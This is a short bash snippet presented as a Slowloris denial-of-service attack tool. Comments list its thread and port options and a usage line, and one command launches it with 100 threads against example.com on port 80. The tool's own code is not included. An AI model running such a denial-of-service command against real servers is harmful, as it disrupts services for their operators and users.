#!/bin/bash
# Slowloris - DoS attack tool
# Options:
# -t : Number of threads
# -p : Port

# Usage: slowloris -t <threads> -p <port> <target_url>
# Example script
slowloris -t 100 -p 80 example.com
